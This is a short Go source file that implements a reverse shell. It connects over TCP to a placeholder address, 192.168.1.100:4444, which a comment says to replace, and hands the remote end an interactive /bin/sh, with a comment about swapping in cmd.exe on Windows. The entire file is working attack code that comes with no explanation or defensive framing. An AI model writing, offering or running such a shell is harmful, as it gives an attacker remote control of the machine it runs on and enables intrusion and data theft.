package main

import (
	"net"
	"os/exec"
	"syscall"
	"os"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.1.100:4444") // replace with another IP and port
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command("/bin/sh") // For windows use cmd.exe
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	cmd.Run()
}
